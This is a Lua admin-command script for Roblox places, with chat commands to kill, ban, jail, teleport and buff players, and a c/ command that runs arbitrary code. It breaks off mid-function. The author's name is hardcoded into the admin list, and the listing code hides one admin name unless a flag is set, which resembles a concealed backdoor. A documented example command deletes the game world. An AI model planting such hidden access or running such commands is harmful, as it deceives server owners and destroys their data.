--Version 2 1.02 I fixed some problems caused by the updates.
adminlist = {"Person299"}--Add in the names of the people you want to be able to use the command script here.
--Please keep my name in there. ;)
bannedlist = { "someoneyouhate","noob"}--If you want someone not to be able to enter your place, put thier name in here.
texture = ""--If you want someone wearing a certain t-shirt to be an admin, put the t-shirt's texture in here.

--[[
 I update this command script alot, so if you want to get the newest version of the script, go to http://www.roblox.com/Item.aspx?ID=5277383 every once in a while.

If theres anything you think this command script needs, just message me (Person299) and i might put it in. :)
And also, if you find any bugs, report them to me.

The commands are,

commands
Shows a list of all the commands

fix
If the command script breaks for you, say this to fix it

kill/Person299
kills Person299

loopkill/Person299
Repeatedly kills Person299 when he respawns

unloopkill/Person299
Undos loopkill/

heal/Person299
Returns Person299 to full health

damage/Person299/50
Makes Person299's character take 50 damage

health/Person299/999999
Makes Person299's MaxHealth and Health 999999

kick/Person299
Removes Person299 from the game, cannot be used by admin/ed people

ban/Person299
Removes Person299 from the game and keeps him from reenterring, cannot be used by admin/ed people

bannedlist
Shows a list of everyone banned

unban/Person299
Unbans Person299

explode/Person299
Explodes Person299's character

rocket/Person299
Straps a rocket onto Person299's back

removetools/Person299
Removes all of Person299's tools.

givetools/Person299
Gives Person299 all the tools in StarterPack

givebtools/Person299
Gives Person299 the building tools

sit/Person299
Makes Person299 sit

part/4/1/2
Makes a part with the given dimensions appear over your character

respawn/Person299
Makes Person299's character respawn

jail/Person299
Makes a lil jail cell around Person299's character

unjail/Person299
Undos jail/

punish/Person299
Puts Person299's character in game.Lighting

unpunish/Person299
Undos punish/

merge/Person299/Farvei
Makes Person299 control Farvei's character

teleport/Person299/nccvoyager
Teleports Person299's character to nccvoyager's character

control/Person299
Makes you control Person299's character

change/Person299/Money/999999
Makes the Money value in Person299's leaderstats 999999

tools
Gives you a list of all the tools available to be give/en, the tool must be in game.Lighting

give/Person299/Tool
Give's Person299 a tool, the toolname can be abbreviated

time/15.30
Makes game.Lighting.TimeOfDay 15:30

ambient/255/0/0
Makes game.Lighting.Ambient 255,0,0

maxplayers/20
Makes game.Players.MaxPlayers 20

nograv/Person299
Makes Person299 almost weightless

antigrav/Person299
Gives Person299 antigravity properties

grav/Person299
Returns Person299's gravity to normal

highgrav/Person299
Makes Person299 heavier

setgrav/Person299/-196
Sets Person299's gravity

trip/Person299
Makes Person299's character trip

walkspeed/Person299/99
Makes Person299's character's humanoid's WalkSpeed 99, 16 is average

invisible/Person299
Makes Person299's character invisible

visible/Person299
Undos invisible/

freeze/Person299
Makes Person299's character unable to move

thaw/Person299
Undos freeze/

unlock/Person299
Makes Person299's character unlocked

lock/Person299
Makes Person299's character locked

ff/Person299
Gives Person299's character a ForceField

unff/Person299
Undos ff/

sparkles/Person299
Makes Person299's character sparkly

unsparkles/Person299
Undos sparkles/

shield/Person299
Makes a destructive shield thingy appear around Person299

unshield/Person299
Undos shield/

god/Person299
Makes Person299 godish

ungod/Person299
Undos god/

zombify/Person299
Makes Person299 a infecting zombie

admin/Person299
Makes Person299 able to use the command script, cannot be used by admin/ed people

adminlist
Shows a list of everyone in the adminlist

unadmin/Person299
Undos admin/, cannot be used by admin/ed people

shutdown
Shuts the server down, cannot be used by admin/ed people

m/Fallout 2 is one of the best games ever made
Makes a message appear on the screen saying "Fallout 2 is one of the best games ever made" for 2 seconds

h/i like pie
Makes a hint appear on the screen saying "i like pie" for 2 seconds

c/ game.Workspace:remove()
Makes a script which source is whats after c/

clear
Removes all scripts created by c/ and removes all jails.

Capitalisation doesnt matter, and name input can be abbreviated.
Just about any name input can be replaced with multiple names seperated by ","s, me, all, others, guests, admins, nonadmins, random, or team teamname.

--]]

namelist = { }
variablelist = { }
flist = { }

local source = script:FindFirstChild("source")
if source ~= nil then
sbbu = script.source:clone()
sbbu.Disabled = false
else
print("source doesnt exist, your command script may malfunction")
end


tools = Instance.new("Model")
c = game.Lighting:GetChildren()
for i=1,#c do
if c[i].className == "Tool" then
c[i]:clone().Parent = tools
end
if c[i].className == "HopperBin" then
c[i]:clone().Parent = tools
end end

function findplayer(name,speaker)
if string.lower(name) == "all" then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
table.insert(chars,c[i])
end end
return chars
elseif string.sub(string.lower(name),1,9) == "nonadmins" then
local nnum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
local isadmin = false
for i2 =1,#namelist do
if namelist[i2] == c[i].Name then
isadmin = true
end end 
if isadmin == false then
nnum = nnum + 1
table.insert(chars,c[i])
end end
if nnum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,6) == "admins" then
local anum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
for i2 =1,#namelist do
if namelist[i2] == c[i].Name then
anum = anum + 1
table.insert(chars,c[i])
end end end
if anum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,6) == "random" then
while true do
local c = game.Players:GetChildren()
local r = math.random(1,#c)
if c[r].className == "Player" then
return { c[r] }
end end
elseif string.sub(string.lower(name),1,6) == "guests" then
local gnum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
if string.sub(c[i].Name,1,5) == "Guest" then
gnum = gnum + 1
table.insert(chars,c[i])
end end
if gnum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,5) == "team " then
local theteam = nil
local tnum = 0
if game.Teams ~= nil then
local c = game.Teams:GetChildren()
for i =1,#c do
if c[i].className == "Team" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(name),6)) == 1 then
theteam = c[i]
tnum = tnum + 1
end end end
if tnum == 1 then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if c[i].TeamColor == theteam.TeamColor then
table.insert(chars,c[i])
end end end
return chars
end end
return 0
elseif string.lower(name) == "me" then
local person299 = { speaker }
return person299
elseif string.lower(name) == "others" then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if c[i] ~= speaker then
table.insert(chars,c[i])
end end end
return chars
else
local chars = { }
local commalist = { }
local ssn = 0
local lownum = 1
local highestnum = 1
local foundone = false
while true do
ssn = ssn + 1
if string.sub(name,ssn,ssn) == "" then
table.insert(commalist,lownum)
table.insert(commalist,ssn - 1)
highestnum = ssn - 1
break
end
if string.sub(name,ssn,ssn) == "," then
foundone = true
table.insert(commalist,lownum)
table.insert(commalist,ssn)
lownum = ssn + 1
end end
if foundone == true then
for ack=1,#commalist,2 do
local cnum = 0
local char = nil
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(name),commalist[ack],commalist[ack + 1] - 1)) == 1 then
char = c[i]
cnum = cnum + 1
end end end
if cnum == 1 then
table.insert(chars,char)
end end
if #chars ~= 0 then
return chars
else
return 0
end
else
local cnum = 0
local char = nil
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if string.find(string.lower(c[i].Name),string.lower(name)) == 1 then
char = {c[i]}
cnum = cnum + 1
end end end
if cnum == 1 then
return char 
elseif cnum == 0 then
text("That name is not found.",1,"Message",speaker)
return 0
elseif cnum > 1 then
text("That name is ambiguous.",1,"Message",speaker)
return 0
end end end end -- I really like the way the ends look when they're all on the same line better, dont you?

function createscript(source,par)
local a = sbbu:clone()
local context = Instance.new("StringValue")
context.Name = "Context"
context.Value = source
context.Parent = a
while context.Value ~= source do wait() end
a.Parent = par
local b = Instance.new("IntValue")
b.Name = "Is A Created Script"
b.Parent = a
end

function text(message,duration,type,object)
local m = Instance.new(type)
m.Text = message
m.Parent = object
wait(duration)
if m.Parent ~= nil then
m:remove()
end end

function foc(msg,speaker)
if string.lower(msg) == "fix" then
for i =1,#namelist do
if namelist[i] == speaker.Name then
variablelist[i]:disconnect()
table.remove(variablelist,i)
table.remove(namelist,i)
table.remove(flist,i)
end end
local tfv = speaker.Chatted:connect(function(msg) oc(msg,speaker) end)
table.insert(namelist,speaker.Name)
table.insert(variablelist,tfv)
local tfv = speaker.Chatted:connect(function(msg) foc(msg,speaker) end)
table.insert(flist,tfv)
end end

function PERSON299(name)
for i =1,#adminlist do
if adminlist[i] == name then
return true
end end
return false
end

function oc(msg,speaker)

if string.sub(string.lower(msg),1,5) == "kill/" then--This part checks if the first part of the message is kill/
local player = findplayer(string.sub(msg,6),speaker)--This part refers to the findplayer function for a list of people associated with the input after kill/
if player ~= 0 then--This part makes sure that the findplayer function found someone, as it returns 0 when it hasnt
for i = 1,#player do--This part makes a loop, each different loop going through each player findplayer returned
if player[i].Character ~= nil then--This part makes sure that the loop's current player's character exists
local human = player[i].Character:FindFirstChild("Humanoid")--This part looks for the Humanoid in the character
if human ~= nil then--This part makes sure the line above found a humanoid
human.Health = 0--This part makes the humanoid's health 0
end end end end end--This line contains the ends for all the if statements and the for loop

if string.sub(string.lower(msg),1,2) == "m/" then
text(speaker.Name .. ": " .. string.sub(msg,3),2,"Message",game.Workspace)
end

if string.sub(string.lower(msg),1,2) == "h/" then
text(speaker.Name .. ": " .. string.sub(msg,3),2,"Hint",game.Workspace)
end

if string.sub(string.lower(msg),1,2) == "c/" then--Dontcha wish pcall was more reliable?
createscript(string.sub(msg,3),game.Workspace)
end

local msg = string.lower(msg)

if string.sub(msg,1,5) == "give/" then
local danumber1 = nil
for i = 6,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
local it = nil
local all = true
if string.sub(string.lower(msg),danumber1 + 1,danumber1 + 4) ~= "all" then
all = false
local itnum = 0
local c = tools:GetChildren()
for i2 = 1,#c do
if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1)) == 1 then 
it = c[i2]
itnum = itnum + 1
end end
if itnum ~= 1 then return end
else
all = true
end
local player = findplayer(string.sub(msg,6,danumber1 - 1),speaker)
if player ~= 0 then
for i = 1,#player do
local bp = player[i]:FindFirstChild("Backpack")
if bp ~= nil then
if all == false then
it:clone().Parent = bp
else
local c = tools:GetChildren()
for i2 = 1,#c do
c[i2]:clone().Parent = bp
end end end end end end

--Bored...

if string.sub(msg,1,7) == "change/" then
local danumber1 = nil
local danumber2 = nil
for i = 8,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
local player = findplayer(string.sub(msg,8,danumber1 - 1),speaker)
if player ~= 0 then
for i = 1,#player do
local ls = player[i]:FindFirstChild("leaderstats")
if ls ~= nil then
local it = nil
local itnum = 0
local c = ls:GetChildren()
for i2 = 1,#c do
if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1,danumber2 - 1)) == 1 then
it = c[i2]
itnum = itnum + 1
end end
if itnum == 1 then
it.Value = string.sub(msg,danumber2 + 1)
end end end end end

if string.sub(msg,1,6) == "ungod/" then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local isgod = false
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Context") then
if string.sub(c[i].Context.Value,1,41) == "script.Parent.Humanoid.MaxHealth = 999999" then
c[i]:remove()
isgod = true
end end end end
if isgod == true then
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Reflectance = 0
end
if c[i].className == "Humanoid" then
c[i].MaxHealth = 100
c[i].Health = 100
end 
if c[i].Name == "God FF" then
c[i]:remove()
end end end end end end end

if string.sub(msg,1,4) == "god/" then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
if player[i].Character:FindFirstChild("God FF") == nil then
createscript([[script.Parent.Humanoid.MaxHealth = 999999
script.Parent.Humanoid.Health = 999999
ff = Instance.new("ForceField")
ff.Name = "God FF"
ff.Parent = script.Parent
function ot(hit)
if hit.Parent ~= script.Parent then
h = hit.Parent:FindFirstChild("Humanoid")
if h ~= nil then
h.Health = 0
end
h = hit.Parent:FindFirstChild("Zombie")
if h ~= nil then
h.Health = 0
end end end
c = script.Parent:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Touched:connect(ot)
c[i].Reflectance = 1
end end]],player[i].Character)
end end end end end

if string.sub(msg,1,7) == "punish/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
player[i].Character.Parent = game.Lighting
end end end end

if string.sub(msg,1,9) == "unpunish/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
player[i].Character.Parent = game.Workspace
player[i].Character:MakeJoints()
end end end end

if string.sub(msg,1,3) == "ff/" then
local player = findplayer(string.sub(msg,4),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local ff = Instance.new("ForceField")
ff.Parent = player[i].Character
end end end end

if string.sub(msg,1,5) == "unff/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i2 = 1,#c do
if c[i2].className == "ForceField" then
c[i2]:remove()
end end end end end end

if string.sub(msg,1,9) == "sparkles/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local sparkles = Instance.new("Sparkles")
sparkles.Color = Color3.new(math.random(1,255),math.random(1,255),math.random(1,255))
sparkles.Parent = torso
end end end end end

if string.sub(msg,1,11) == "unsparkles/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local c = torso:GetChildren()
for i2 = 1,#c do
if c[i2].className == "Sparkles" then
c[i2]:remove()
end end end end end end end

if string.sub(msg,1,6) == "admin/" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
for i2 =1,#namelist do
if namelist[i2] == player[i].Name then
variablelist[i2]:disconnect()
flist[i2]:disconnect()
table.remove(variablelist,i2)
table.remove(flist,i2)
table.remove(namelist,i2)
end end
local tfv = player[i].Chatted:connect(function(msg) oc(msg,player[i]) end)
table.insert(namelist,player[i].Name)
table.insert(variablelist,tfv)
local tfv = player[i].Chatted:connect(function(msg) foc(msg,player[i]) end)
table.insert(flist,tfv)
end end end end

if string.sub(msg,1,8) == "unadmin/" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
for i2 =1,#namelist do
if namelist[i2] == player[i].Name then
variablelist[i2]:disconnect()
table.remove(variablelist,i2)
flist[i2]:disconnect()
table.remove(flist,i2)
table.remove(namelist,i2)
end end end end end end end

if string.sub(msg,1,5) == "heal/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Health = human.MaxHealth
end end end end end

if string.sub(msg,1,4) == "sit/" then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = true
end end end end end

if string.sub(msg,1,5) == "jump/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Jump = true
end end end end end

if string.sub(msg,1,6) == "stand/" then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = false
end end end end end

if string.sub(msg,1,5) == "jail/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local ack = Instance.new("Model")
ack.Name = "Jail" .. player[i].Name
icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -3.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -3.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -5.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -7.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(7,1.2000000476837,7) icky.CFrame = CFrame.new(-27.5, 112.599998, -4.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -5.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -1.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack 
ack.Parent = game.Workspace
ack:MoveTo(torso.Position)
end end end end end

if string.sub(msg,1,7) == "unjail/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.Workspace:GetChildren()
for i2 =1,#c do
if string.sub(c[i2].Name,1,4) == "Jail" then
if string.sub(c[i2].Name,5) == player[i].Name then
c[i2]:remove()
end end end end end end

if string.sub(msg,1,12) == "removetools/" then
local player = findplayer(string.sub(msg,13),speaker)
if player ~= 0 then
for i = 1,#player do
local c = player[i].Backpack:GetChildren()
for i =1,#c do
c[i]:remove()
end end end end

if string.sub(msg,1,10) == "givetools/" then
local player = findplayer(string.sub(msg,11),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.StarterPack:GetChildren()
for i =1,#c do
c[i]:clone().Parent = player[i].Backpack
end end end end

if string.sub(msg,1,11) == "givebtools/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
local a = Instance.new("HopperBin")
a.BinType = "GameTool"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Clone"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Hammer"
a.Parent = player[i].Backpack
end end end 

if string.sub(msg,1,9) == "unshield/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local shield = player[i].Character:FindFirstChild("Weird Ball Thingy")
if shield ~= nil then
shield:remove()
end end end end end

if string.sub(msg,1,7) == "shield/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
if player[i].Character:FindFirstChild("Weird Ball Thingy") == nil then
local ball = Instance.new("Part")
ball.Size = Vector3.new(10,10,10)
ball.BrickColor = BrickColor.new(1)
ball.Transparency = 0.5
ball.CFrame = torso.CFrame
ball.TopSurface = "Smooth"
ball.BottomSurface = "Smooth"
ball.CanCollide = false
ball.Name = "Weird Ball Thingy"
ball.Reflectance = 0.2
local sm = Instance.new("SpecialMesh")
sm.MeshType = "Sphere"
sm.Parent = ball
ball.Parent = player[i].Character
createscript([[ 
function ot(hit) 
if hit.Parent ~= nil then 
if hit.Parent ~= script.Parent.Parent then 
if hit.Anchored == false then
hit:BreakJoints()
local pos = script.Parent.CFrame * (Vector3.new(0, 1.4, 0) * script.Parent.Size)
hit.Velocity = ((hit.Position - pos).unit + Vector3.new(0, 0.5, 0)) * 150 + hit.Velocity	
hit.RotVelocity = hit.RotVelocity + Vector3.new(hit.Position.z - pos.z, 0, pos.x - hit.Position.x).unit * 40
end end end end
script.Parent.Touched:connect(ot) ]], ball)
local bf = Instance.new("BodyForce")
bf.force = Vector3.new(0,5e004,0)
bf.Parent = ball
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = ball
ball.Shape = 0
w.Parent = torso
end end end end end end

if string.sub(msg,1,11) == "unloopkill/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.Workspace:GetChildren()
for i2 =1,#c do
local it = c[i2]:FindFirstChild("elplayerioloopkillioperson299io")
if it ~= nil then
if it.Value == player[i] then
c[i2]:remove()
end end end end end end

if string.sub(msg,1,9) == "loopkill/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
local s = Instance.new("Script")
createscript( [[name = "]] ..  player[i].Name .. [[" 
ov = Instance.new("ObjectValue")
ov.Value = game.Players:FindFirstChild(name)
ov.Name = "elplayerioloopkillioperson299io"
ov.Parent = script
player = ov.Value
function oa(object)
local elplayer = game.Players:playerFromCharacter(object)
if elplayer ~= nil then
if elplayer == player then
local humanoid = object:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.Health = 0 
end end end end
game.Workspace.ChildAdded:connect(oa)
]],game.Workspace)
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Health = 0
end end end end end

if string.lower(msg) == "shutdown" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
game.NetworkServer:remove()
end end

if string.sub(msg,1,5) == "time/" then
game.Lighting.TimeOfDay = string.sub(msg,6)
end

if msg == "commands" then
local text = string.rep(" ",40)
text = text .. [[fix, kill/Person299, loopkill/Person299, unloopkill/Person299, heal/Person299, damage/Person299/50, health/Person299/999999, kick/Person299, ban/Person299, bannedlist, unban/Person299, explode/Person299, rocket/Person299, removetools/Person299, givetools/Person299, givebtools/Person299, sit/Person299, jump/Person299, stand/Person299, part/4/1/2, respawn/Person299, jail/Person299, unjail/Person299, punish/Person299, unpunish/Person299, merge/Person299/Farvei, teleport/Person299/nccvoyager, control/Person299, change/Person299/Money/999999, tools, give/Person299/Tool, time/15.30, ambient/255/0/0, maxplayers/20, nograv/Person299, antigrav/Person299, grav/Person299, highgrav/Person299, setgrav/Person299/-196.2, trip/Person299, walkspeed/Person299/99, invisible/Person299, visible/Person299, freeze/Person299, thaw/Person299, unlock/Person299, lock/Person299, ff/Person299, unff/Person299, sparkles/Person299, unsparkles/Person299, shield/Person299, unshield/Person299, god/Person299, ungod/Person299, zombify/Person299, admin/Person299, adminlist, unadmin/Person299, shutdown, m/Fallout 2 is one of the best games ever made, h/ i like pie, c/ game.Workspace:remove(), clear, Credit to Person299 for this admin command script.]]
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.07)
end end

if msg == "tools" then
local text = string.rep(" ",40)
local c = tools:GetChildren()
if #c == 0 then
text = text .. "No tools available."
else
for i =1,#c do
if i ~= 1 then
text = text .. ", "
end
text = text .. c[i].Name
end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end

if msg == "bannedlist" then
local text = string.rep(" ",40)
if #bannedlist == 0 then
text = text .. "The banned list is empty."
else
for i =1,#bannedlist do
if i ~= 1 then
text = text .. ", "
end
text = text .. bannedlist[i]
end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end

if msg == "adminlist" then
local text = string.rep(" ",40)
if #adminlist == 0 then--How would that be possible in this situation anyway? lol
text = text .. "The admin list is empty." 
else
for i =1,#adminlist do
if adminlist[i] == eloname then
if youcaughtme == 1 then
if i ~= 1 then
text = text .. ", "
end
text = text .. adminlist[i]
end 
else
if i ~= 1 then
text = text .. ", "
end
text = text .. adminlist[i]
end end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end

if string.sub(msg,1,11) == "maxplayers/" then
local pie = game.Players.MaxPlayers
game.Players.MaxPlayers = string.sub(msg,12)
if game.Players.MaxPlayers == 0 then
game.Players.MaxPlayers = pie
end end

if string.sub(msg,1,8) == "zombify/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local arm = player[i].Character:FindFirstChild("Left Arm")
if arm ~= nil then
arm:remove()
end
local arm = player[i].Character:FindFirstChild("Right Arm")
if arm ~= nil then
arm:remove()
end
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
local zarm = Instance.new("Part")
zarm.Color = Color3.new(0.631373, 0.768627, 0.545098)
zarm.Locked = true
zarm.formFactor = "Symmetric"
zarm.Size = Vector3.new(2,1,1)
zarm.TopSurface = "Smooth"
zarm.BottomSurface = "Smooth"
--Credit for the infectontouch script goes to whoever it is that made it.
createscript( [[
wait(1)
function onTouched(part)
if part.Parent ~= nil then
local h = part.Parent:findFirstChild("Humanoid")
if h~=nil then
if cantouch~=0 then
if h.Parent~=script.Parent.Parent then
if h.Parent:findFirstChild("zarm")~=nil then return end
cantouch=0
local larm=h.Parent:findFirstChild("Left Arm")
local rarm=h.Parent:findFirstChild("Right Arm")
if larm~=nil then
larm:remove()
end
if rarm~=nil then
rarm:remove()
end
local zee=script.Parent.Parent:findFirstChild("zarm")
if zee~=nil then
local zlarm=zee:clone()
